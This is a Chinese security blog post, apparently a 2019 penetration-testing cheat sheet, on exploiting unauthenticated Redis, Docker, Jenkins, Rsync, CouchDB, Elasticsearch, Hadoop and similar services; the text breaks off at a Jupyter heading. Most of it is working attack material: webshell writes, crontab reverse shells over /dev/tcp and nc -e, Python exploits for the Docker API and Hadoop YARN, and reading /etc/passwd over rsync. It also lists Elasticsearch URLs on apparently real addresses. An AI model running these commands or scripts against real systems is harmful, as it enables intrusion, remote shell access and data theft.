

<!DOCTYPE html>
<html lang>
<head prefix="og: http://ogp.me/ns#"><meta name="generator" content="Hexo 3.9.0">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
    <meta name="description" content>
    <title>常见组件未授权访问漏洞利用 | thinks blog</title>

    <!-- Open Graph -->
    <meta name="description" content="简单总结下常见组件未授权访问漏洞利用方式">
<meta name="keywords" content="web安全">
<meta property="og:type" content="article">
<meta property="og:title" content="常见组件未授权访问漏洞利用">
<meta property="og:url" content="http://yoursite.com/2019/08/28/常见组件未授权访问漏洞利用/index.html">
<meta property="og:site_name" content="thinks blog">
<meta property="og:description" content="简单总结下常见组件未授权访问漏洞利用方式">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2019-08-29T03:01:11.673Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="常见组件未授权访问漏洞利用">
<meta name="twitter:description" content="简单总结下常见组件未授权访问漏洞利用方式">

    <script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Person",
  "email": "mailto:",
  "image": "",
  "name": "热爱生活、热爱学习",
  "url": "http://yoursite.com"
}
</script>
    <script>
    var algoliaEnabled = false;
    
</script>

    

    
    
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
    
    
    
        <!-- stylesheets list from config.yml -->
        
        <link rel="stylesheet" href="/css/aloha.css">
        
        <link rel="stylesheet" href="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.css">
        
        <link rel="stylesheet" href="//cdn.bootcss.com/magnific-popup.js/1.1.0/magnific-popup.min.css">
        
    

</head>
<body id="body" style="margin-bottom: 0;" class="pushable">

    <div class="ui top fixed menu">
        <a class="item" id="menu-icon"><i class="sidebar icon"></i></a>
    </div>

    <div id="menu-sidebar" class="ui left vertical sidebar menu">

    <div id="sidebar-top">
        <div class="content">
            <h3>thinks blog</h3>
        </div>
    </div>
    <div class="ui container sidebar-card">
    <div class="ui people shape content">
        <div class="active side">
            <div class="ui card">
                <div class="image">
                    <img class="ui medium bordered image" src="/images/avatar.jpg">
                </div>
                <div class="content">
                    <a class="header">热爱生活、热爱学习</a>
                    
                </div>
                <div class="extra content">
                    <div class="ui list">
                        
                        
                    </div>

                </div>
                <div class="extra content">
                    <div class="ui list">
                        
                    </div>
                </div>
            </div>
        </div>
    </div>


</div>

    
    

    

    
    <a href="/index.html" class="item">
        <i class="home icon"></i>
        HOME
    </a>

    

    
</div>

    <div class="pusher body-content">
        <div id="content" class="ui main container">
            <!--<div class="ui one column grid">-->
                <!--<div class="column">-->
                    <!--<div class="ui main container">-->
                        <div id="post-常见组件未授权访问漏洞利用" class="ui main container article-type-post">

    

    <div class="ui divided grid">

        <div class="two column row" id="article-content">

            <div class="thirteen wide computer thirteen wide tablet sixteen wide mobile column">
                

<h1 class="ui header">
    
    常见组件未授权访问漏洞利用
</h1>



                <div class="article-inner">

                    <div class="article-entry" itemprop="articleBody">
                        
                        <p>&#x7B80;&#x5355;&#x603B;&#x7ED3;&#x4E0B;&#x5E38;&#x89C1;&#x7EC4;&#x4EF6;&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x65B9;&#x5F0F;</p>
<a id="more"></a>

<p>&#x611F;&#x8C22;&#x5927;&#x4F6C;&#x7684;&#x603B;&#x7ED3; <a href="https://xz.aliyun.com/t/6103" target="_blank" rel="noopener">https://xz.aliyun.com/t/6103</a></p>
<h2 id="Redis-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#Redis-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="Redis &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>Redis &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>1. &#x5199;webshell
config set dir /var/www/html
config set fbfilename test.php
config set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;
save
2. &#x5199;crontab&#x53CD;&#x5F39;shell
redis-cli.exe -h 192.168.18.138
config set dir /var/spool/cron
set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.15.3/5555 0&gt;&amp;1\n\n\n&quot;
config set dbfilename root
save
3.Redis &#x57FA;&#x4E8E;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x7684; RCE
https://paper.seebug.org/975/</code></pre><h2 id="MongoDB-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#MongoDB-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="MongoDB &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>MongoDB &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>&#x76F4;&#x63A5;&#x8FDE;&#x63A5;&#xFF0C;&#x6CC4;&#x9732;&#x654F;&#x611F;&#x4FE1;&#x606F;&#xFF0C;&#x589E;&#x5220;&#x67E5;&#x6539;
&#x4F7F;&#x7528; NoSQLBooster &#x8FDE;&#x63A5;
&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;https://s3.mongobooster.com/download/releasesv5/nosqlbooster4mongo-5.1.12.exe</code></pre><h2 id="Jenkins-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#Jenkins-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="Jenkins &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>Jenkins &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>http://www.secpulse.com:8080/manage
http://www.secpulse.com:8080/script
&#x70B9;&#x51FB; &quot;&#x811A;&#x672C;&#x547D;&#x4EE4;&#x6267;&#x884C;&quot; 
&#x53EF;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4; println &quot;whoami&quot;.execute().tex
&#x5199;&#x6587;&#x4EF6; new File (&quot;/var/www/html/shell.php&quot;).write(&apos;&lt;?php phpinfo(); ?&gt;&apos;)</code></pre><h2 id="Memcached-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#Memcached-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="Memcached &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>Memcached &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>Memcached&#x662F;&#x4E00;&#x5957;&#x5E38;&#x7528;&#x7684;key-value&#x7F13;&#x5B58;&#x7CFB;&#x7EDF;&#xFF0C;&#x7531;&#x4E8E;&#x5B83;&#x672C;&#x8EAB;&#x6CA1;&#x6709;&#x6743;&#x9650;&#x63A7;&#x5236;&#x6A21;&#x5757;&#xFF0C;&#x6240;&#x4EE5;&#x5BF9;&#x516C;&#x7F51;&#x5F00;&#x653E;&#x7684;Memcache&#x670D;&#x52A1;&#x5F88;&#x5BB9;&#x6613;&#x88AB;&#x653B;&#x51FB;&#x8005;&#x626B;&#x63CF;&#x53D1;&#x73B0;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x901A;&#x8FC7;&#x547D;&#x4EE4;&#x4EA4;&#x4E92;&#x53EF;&#x76F4;&#x63A5;&#x8BFB;&#x53D6;Memcached&#x4E2D;&#x7684;&#x654F;&#x611F;&#x4FE1;&#x606F;&#x3002;
&#x6D4B;&#x8BD5;&#x6F0F;&#x6D1E;&#xFF1A;
telnet 10.0.4.138 11211 &#x6216; nc -vv &lt;target&gt; 11211
&#x65E0;&#x9700;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8FDE;&#x63A5;memcache &#x670D;&#x52A1;&#x7684;11211&#x7AEF;&#x53E3;</code></pre><h2 id="JBOSS-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#JBOSS-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="JBOSS &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>JBOSS &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x8BBF;&#x95EE; http://ip:8080/jmx-console &#x5C31;&#x53EF;&#x4EE5;&#x6D4F;&#x89C8; JBoss &#x7684;&#x90E8;&#x7F72;&#x7BA1;&#x7406;&#x7684;&#x4FE1;&#x606F;&#x4E0D;&#x9700;&#x8981;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x90E8;&#x7F72;&#x4E0A;&#x4F20;&#x6728;&#x9A6C;
EXP: https://www.exploit-db.com/exploits/36575</code></pre><h2 id="Docker-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#Docker-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="Docker &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>Docker &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>Docker Remote API&#x662F;&#x4E00;&#x4E2A;&#x53D6;&#x4EE3;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x884C;&#x754C;&#x9762;&#xFF08;rcli&#xFF09;&#x7684;REST API&#x3002;
&#x901A;&#x8FC7; docker client &#x6216;&#x8005; http &#x76F4;&#x63A5;&#x8BF7;&#x6C42;&#x5C31;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x8FD9;&#x4E2A; API&#xFF0C;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x63A5;&#x53E3;&#xFF0C;
&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x65B0;&#x5EFA; container&#xFF0C;&#x5220;&#x9664;&#x5DF2;&#x6709; container&#xFF0C;&#x751A;&#x81F3;&#x662F;&#x83B7;&#x53D6;&#x5BBF;&#x4E3B;&#x673A;&#x7684; shell&#x3002;
&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6D4B;&#x8BD5;&#xFF1A; docker -H tcp://192.168.15.5:2375 version
&#x901A;&#x8FC7;crontab&#x53CD;&#x5F39;&#x5BBF;&#x4E3B;&#x673A;shell

# vps&#x76D1;&#x542C;9999&#x7AEF;&#x53E3;
nc -lvnp 9999

# &#x542F;&#x52A8;&#x5BB9;&#x5668;&#xFF0C;&#x5E76;&#x6302;&#x8F7D;&#x672C;&#x5730;/etc/crontabs&#x76EE;&#x5F55;
docker -H tcp://192.168.15.5:2375 run -id -v /etc/crontabs:/tmp alpine:latest
docker -H tcp://192.168.15.5:2375 ps

docker -H tcp://192.168.15.5:2375 exec -it a8ff7ed880fb sh # &#x8FDB;&#x5165;&#x5BB9;&#x5668;

#&#x5199;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#x53CD;&#x5F39;shell
echo &apos;* * * * * /usr/bin/nc {vps_ip} 9999 -e /bin/sh&apos; &gt;&gt; /tmp/root #&#x6DFB;&#x52A0;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;
cat /tmp/root # &#x67E5;&#x770B;/tmp/root &#x6587;&#x4EF6;
exit #&#x9000;&#x51FA;&#x5BB9;&#x5668;
&#x5229;&#x7528;&#x7684;python&#x811A;&#x672C;&#xFF1A;
import docker
client = docker.DockerClient(base_url=&apos;http://{target_ip}:2375/&apos;)
data = client.containers.run(&apos;alpine:latest&apos;, r&apos;&apos;&apos;sh -c &quot;echo &apos;* * * * * /usr/bin/nc {vps_ip} 9999 -e /bin/sh&apos; &gt;&gt; /tmp/etc/crontabs/root&quot; &apos;&apos;&apos;, remove=True, volumes={&apos;/etc&apos;: {&apos;bind&apos;: &apos;/tmp/etc&apos;, &apos;mode&apos;: &apos;rw&apos;}})
https://github.com/Tycx2ry/docker_api_vul</code></pre><h2 id="ZooKeeper-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#ZooKeeper-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="ZooKeeper &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>ZooKeeper &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>Zookeeper&#x7684;&#x9ED8;&#x8BA4;&#x5F00;&#x653E;&#x7AEF;&#x53E3;&#x662F;2181&#x3002;Zookeeper&#x5B89;&#x88C5;&#x90E8;&#x7F72;&#x4E4B;&#x540E;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x4E0D;&#x9700;&#x8981;&#x4EFB;&#x4F55;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF0C;
&#x9020;&#x6210;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x8FDC;&#x7A0B;&#x5229;&#x7528;Zookeeper&#xFF0C;&#x901A;&#x8FC7;&#x670D;&#x52A1;&#x5668;&#x6536;&#x96C6;&#x654F;&#x611F;&#x4FE1;&#x606F;&#x6216;&#x8005;&#x5728;Zookeeper&#x96C6;&#x7FA4;&#x5185;&#x8FDB;&#x884C;&#x7834;&#x574F;&#xFF08;&#x6BD4;&#x5982;&#xFF1A;kill&#x547D;&#x4EE4;&#xFF09;&#x3002;
&#x653B;&#x51FB;&#x8005;&#x80FD;&#x591F;&#x6267;&#x884C;&#x6240;&#x6709;&#x53EA;&#x5141;&#x8BB8;&#x7531;&#x7BA1;&#x7406;&#x5458;&#x8FD0;&#x884C;&#x7684;&#x547D;&#x4EE4;
&#x6D4B;&#x8BD5;&#x6F0F;&#x6D1E;&#xFF1A; echo envi | nc ip por
&#x76F4;&#x63A5;&#x8FDE;&#x63A5;&#xFF1A; ./zkCli.sh -server ip:por</code></pre><h2 id="Rsync-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#Rsync-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="Rsync &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>Rsync &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>Rsync&#xFF08;remote synchronize&#xFF09;&#x662F;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B;&#x6570;&#x636E;&#x540C;&#x6B65;&#x5DE5;&#x5177;&#xFF0C;
&#x53EF;&#x901A;&#x8FC7; LAN/WAN &#x5FEB;&#x901F;&#x540C;&#x6B65;&#x591A;&#x53F0;&#x4E3B;&#x673A;&#x95F4;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x540C;&#x6B65;&#x672C;&#x5730;&#x786C;&#x76D8;&#x4E2D;&#x7684;&#x4E0D;&#x540C;&#x76EE;&#x5F55;&#x3002;
Rsync &#x9ED8;&#x8BA4;&#x5141;&#x8BB8;&#x533F;&#x540D;&#x8BBF;&#x95EE;&#xFF0C;&#x5982;&#x679C;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x6CA1;&#x6709;&#x76F8;&#x5173;&#x7684;&#x7528;&#x6237;&#x8BA4;&#x8BC1;&#x4EE5;&#x53CA;&#x6587;&#x4EF6;&#x6388;&#x6743;&#xFF0C;&#x5C31;&#x4F1A;&#x89E6;&#x53D1;&#x9690;&#x60A3;&#x3002;Rsync &#x7684;&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#x4E3A; 837

&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6D4B;&#x8BD5; 
#rsync rsync://{target_ip}/
rsync rsync://172.16.2.250:873/
rsync rsync://172.16.2.250:873/src

#&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;
rsync rsync://172.16.2.250:873/src/etc/passwd ./

#&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#xFF0C; &#x4E0A;&#x4F20;nc.sh &#x5230; cron.hourly
rsync -av nc.sh rsync://172.16.2.250:873/src/etc/cron.hourly</code></pre><h2 id="CouchDB-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#CouchDB-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="CouchDB &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>CouchDB &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>Apache CouchDB&#x662F;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x4E13;&#x6CE8;&#x4E8E;&#x6613;&#x7528;&#x6027;&#x548C;&#x6210;&#x4E3A;&quot;&#x5B8C;&#x5168;&#x62E5;&#x62B1;web&#x7684;&#x6570;&#x636E;&#x5E93;&quot;&#x3002;
&#x5B83;&#x662F;&#x4E00;&#x4E2A;&#x4F7F;&#x7528;JSON&#x4F5C;&#x4E3A;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#xFF0C;JavaScript&#x4F5C;&#x4E3A;&#x67E5;&#x8BE2;&#x8BED;&#x8A00;&#xFF0C;MapReduce&#x548C;HTTP&#x4F5C;&#x4E3A;API&#x7684;NoSQL&#x6570;&#x636E;&#x5E93;&#x3002;
&#x5E94;&#x7528;&#x5E7F;&#x6CDB;&#xFF0C;&#x5982;BBC&#x7528;&#x5728;&#x5176;&#x52A8;&#x6001;&#x5185;&#x5BB9;&#x5C55;&#x793A;&#x5E73;&#x53F0;&#xFF0C;Credit Suisse&#x7528;&#x5728;&#x5176;&#x5185;&#x90E8;&#x7684;&#x5546;&#x54C1;&#x90E8;&#x95E8;&#x7684;&#x5E02;&#x573A;&#x6846;&#x67B6;&#xFF0C;Meebo&#xFF0C;&#x7528;&#x5728;&#x5176;&#x793E;&#x4EA4;&#x5E73;&#x53F0;&#xFF08;web&#x548C;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF09;,
&#x9ED8;&#x8BA4;&#x4F1A;&#x5728;5984&#x7AEF;&#x53E3;&#x5F00;&#x653E;Restful&#x7684;API&#x63A5;&#x53E3;&#xFF0C;&#x5982;&#x679C;&#x4F7F;&#x7528;SSL&#x7684;&#x8BDD;&#x5C31;&#x4F1A;&#x76D1;&#x542C;&#x5728;6984&#x7AEF;&#x53E3;&#xFF0C;&#x7528;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7BA1;&#x7406;&#x529F;&#x80FD;&#x3002;
&#x5176;HTTP Server&#x9ED8;&#x8BA4;&#x5F00;&#x542F;&#x65F6;&#x6CA1;&#x6709;&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;&#xFF0C;&#x800C;&#x4E14;&#x7ED1;&#x5B9A;&#x5728;0.0.0.0&#xFF0C;&#x6240;&#x6709;&#x7528;&#x6237;&#x5747;&#x53EF;&#x901A;&#x8FC7;API&#x8BBF;&#x95EE;&#x5BFC;&#x81F4;&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x3002;

&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6D4B;&#x8BD5;
curl http://192.168.18.129:5984
curl http://192.168.18.129:5984/_config

&#x547D;&#x4EE4;&#x6267;&#x884C;
curl -X PUT &apos;http://192.168.18.129:5984/_config/query_servers/cmd&apos; -d &apos;&quot;curl http://192.168.18.138:9999/test.php&quot;&apos;</code></pre><h2 id="Elasticsearch-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#Elasticsearch-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="Elasticsearch &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>Elasticsearch &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>ElasticSearch&#x662F;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;Lucene&#x7684;&#x641C;&#x7D22;&#x670D;&#x52A1;&#x5668;&#x3002;&#x5B83;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x591A;&#x7528;&#x6237;&#x80FD;&#x529B;&#x7684;&#x5168;&#x6587;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#xFF0C;&#x57FA;&#x4E8E;RESTful web&#x63A5;&#x53E3;&#x3002;
Elasticsearch&#x662F;&#x7528;Java&#x5F00;&#x53D1;&#x7684;&#xFF0C;&#x5E76;&#x4F5C;&#x4E3A;Apache&#x8BB8;&#x53EF;&#x6761;&#x6B3E;&#x4E0B;&#x7684;&#x5F00;&#x653E;&#x6E90;&#x7801;&#x53D1;&#x5E03;&#xFF0C;&#x662F;&#x5F53;&#x524D;&#x6D41;&#x884C;&#x7684;&#x4F01;&#x4E1A;&#x7EA7;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x3002;
Elasticsearch&#x7684;&#x589E;&#x5220;&#x6539;&#x67E5;&#x64CD;&#x4F5C;&#x5168;&#x90E8;&#x7531;http&#x63A5;&#x53E3;&#x5B8C;&#x6210;&#x3002;&#x7531;&#x4E8E;Elasticsearch&#x6388;&#x6743;&#x6A21;&#x5757;&#x9700;&#x8981;&#x4ED8;&#x8D39;&#xFF0C;&#x6240;&#x4EE5;&#x514D;&#x8D39;&#x5F00;&#x6E90;&#x7684;Elasticsearch&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;&#x3002;
&#x8BE5;&#x6F0F;&#x6D1E;&#x5BFC;&#x81F4;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x62E5;&#x6709;Elasticsearch&#x7684;&#x6240;&#x6709;&#x6743;&#x9650;&#x3002;&#x53EF;&#x4EE5;&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x4EFB;&#x610F;&#x64CD;&#x4F5C;&#x3002;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x5C06;&#x9762;&#x4E34;&#x654F;&#x611F;&#x6570;&#x636E;&#x6CC4;&#x9732;&#x3001;&#x6570;&#x636E;&#x4E22;&#x5931;&#x3001;&#x6570;&#x636E;&#x906D;&#x5230;&#x7834;&#x574F;&#x751A;&#x81F3;&#x906D;&#x5230;&#x653B;&#x51FB;&#x8005;&#x7684;&#x52D2;&#x7D22;&#x3002;
Elasticsearch&#x670D;&#x52A1;&#x666E;&#x904D;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x901A;&#x5E38;&#x53EF;&#x4EE5;&#x8BF7;&#x6C42;&#x4E00;&#x4E2A;&#x5F00;&#x653E;9200&#x6216;9300&#x7684;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x6076;&#x610F;&#x653B;&#x51FB;&#x3002;
&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6D4B;&#x8BD5;
curl http://localhost:9200/_nodes #&#x67E5;&#x770B;&#x8282;&#x70B9;&#x6570;&#x636E;

&#x8C03;&#x7528;api&#xFF0C;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x7684;&#x589E;&#x5220;&#x6539;&#x64CD;&#x4F5C;&#x3002;
http://x.x.x.x:9200/_nodes
http://x.x.x.x:9200/_river

&#x4E00;&#x4E9B;&#x5229;&#x7528;url
http://101.198.161.130:9200/_cat/indices/
http://101.198.161.130:9200/_plugin/head/
http://101.198.161.130:9200/_nodes
http://101.198.161.130:9200/_nodes?prettify
http://101.198.161.130:9200/_status
http://101.198.161.130:9200/_search?pretty
http://10.203.9.131:9200/zjftu/
http://10.203.9.131:9200/zjftu/_search?pretty</code></pre><h2 id="Hadoop-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#Hadoop-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="Hadoop &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>Hadoop &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>Hadoop&#x662F;&#x4E00;&#x4E2A;&#x7531;Apache&#x57FA;&#x91D1;&#x4F1A;&#x6240;&#x5F00;&#x53D1;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x57FA;&#x7840;&#x67B6;&#x6784;&#xFF0C;&#x7531;&#x4E8E;&#x670D;&#x52A1;&#x5668;&#x76F4;&#x63A5;&#x5728;&#x5F00;&#x653E;&#x4E86; Hadoop &#x673A;&#x5668; HDFS &#x7684; 50070 web &#x7AEF;&#x53E3;&#x53CA;&#x90E8;&#x5206;&#x9ED8;&#x8BA4;&#x670D;&#x52A1;&#x7AEF;&#x53E3;&#xFF0C;
&#x9ED1;&#x5BA2;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x547D;&#x4EE4;&#x884C;&#x64CD;&#x4F5C;&#x591A;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5982;&#x8FDB;&#x884C;&#x5220;&#x9664;&#xFF0C;&#x4E0B;&#x8F7D;&#xFF0C;&#x76EE;&#x5F55;&#x6D4F;&#x89C8;&#x751A;&#x81F3;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7B49;&#x64CD;&#x4F5C;&#xFF0C;&#x4EA7;&#x751F;&#x6781;&#x5927;&#x7684;&#x5371;&#x5BB3;&#x3002;

&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6D4B;&#x8BD5;
&#x8BBF;&#x95EE; http://192.168.18.129:8088/cluster

&#x901A;&#x8FC7;REST API&#x547D;&#x4EE4;&#x6267;&#x884C;
&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#xFF1A;
&#x5728;&#x672C;&#x5730;&#x76D1;&#x542C;&#x7AEF;&#x53E3; &gt;&gt; &#x521B;&#x5EFA;Application &gt;&gt; &#x8C03;&#x7528;Submit Application API&#x63D0;&#x4EA4;

python EXP:
#!/usr/bin/env python
import requests

target = &apos;http://192.168.18.129:8088/&apos;
lhost = &apos;192.168.18.138&apos; # put your local host ip here, and listen at port 9999
url = target + &apos;ws/v1/cluster/apps/new-application&apos;
resp = requests.post(url)
app_id = resp.json()[&apos;application-id&apos;]
url = target + &apos;ws/v1/cluster/apps&apos;
data = {
    &apos;application-id&apos;: app_id,
    &apos;application-name&apos;: &apos;get-shell&apos;,
    &apos;am-container-spec&apos;: {
        &apos;commands&apos;: {
            &apos;command&apos;: &apos;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&apos; % lhost,
        },
    },
    &apos;application-type&apos;: &apos;YARN&apos;,
}
requests.post(url, json=data)</code></pre><h2 id="Jupyter-Notebook-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#Jupyter-Notebook-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="Jupyter Notebook &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>Jupyter Notebook &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>Jupyter Notebook&#xFF08;&#x6B64;&#x524D;&#x88AB;&#x79F0;&#x4E3A; IPython notebook&#xFF09;&#x662F;&#x4E00;&#x4E2A;&#x4EA4;&#x4E92;&#x5F0F;&#x7B14;&#x8BB0;&#x672C;&#xFF0C;&#x652F;&#x6301;&#x8FD0;&#x884C; 40 &#x591A;&#x79CD;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x3002;
